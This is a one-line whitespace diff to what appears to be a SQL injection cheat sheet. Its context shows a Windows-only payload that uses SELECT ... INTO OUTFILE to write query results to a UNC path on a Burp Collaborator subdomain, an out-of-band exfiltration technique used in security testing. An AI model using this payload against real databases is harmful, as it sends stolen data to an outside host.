@@ -240,4 +240,3 @@ The following technique works on Windows only:
 ```sql
 SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 ```
-
